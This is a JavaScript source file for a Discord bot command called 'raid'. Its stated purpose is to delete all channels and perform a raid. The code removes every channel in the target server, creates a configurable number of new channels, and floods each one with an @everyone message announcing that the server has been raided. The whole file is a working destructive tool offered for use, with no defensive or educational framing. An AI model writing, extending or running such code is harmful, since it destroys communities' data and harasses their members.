const { ChannelType } = require('discord.js');

module.exports = {
  name: 'raid',
  description: 'Deletes all channels and performs a raid.',
  async execute(interaction) {
    const { guild } = interaction;

    // Defaults
    const defaultMessage = `YOUR SERVER HAS BEEN RAIDED BY ${interaction.client.user} !!! \n @everyone`;
    const defaultSpamAMT = 10;
    const defaultChannelName = 'RAID';
    const defaultErrorMessage = 'An internal error has occurred, please check console.';
    const defaultNumberOfMessagesPerChannel = 5; // Change this to the desired number of messages per channel

    const throwInteractionError = (errorMessage) => {
      interaction.reply({ content: errorMessage, ephemeral: true });
    }

    let spamAMTbyUser = interaction.options.getInteger('message-amount') || defaultSpamAMT;
    let userMessage = interaction.options.getString('raid-message') || defaultMessage;
    let userChannelName = interaction.options.getString('channel-name') || defaultChannelName;
    let numberOfMessagesPerChannel = interaction.options.getInteger('message-amt-per-channel') || defaultNumberOfMessagesPerChannel

    try {
      const channels = Array.from(guild.channels.cache.values());
      await Promise.all(channels.map(channel => channel.delete()));
    } catch (error) {
      console.error("Error deleting channels:", error);
      throwInteractionError('Raid Failed ! Invalid Permissions.');
      return;
    }

    try {
      const newChannel = await guild.channels.create({
        name: `${userChannelName}`,
        type: ChannelType.GuildText,
      });

      await Promise.all(
        Array.from({ length: spamAMTbyUser }, async (_, i) => {
          const duplicateChannel = await guild.channels.create({
            name: `${userChannelName}-${i + 1}`,
            type: ChannelType.GuildText,
            parent: newChannel.parent,
          });

          await Promise.all(
            Array.from({ length: numberOfMessagesPerChannel }, async () => {
              try {
                await duplicateChannel.send(userMessage);
              } catch (error) {
                console.error("Error sending message:", error);
              }
            })
          );
        })
      );
    } catch (error) {
      throwInteractionError(defaultErrorMessage);
      console.error("Error creating channels:", error);
    }
  }
}
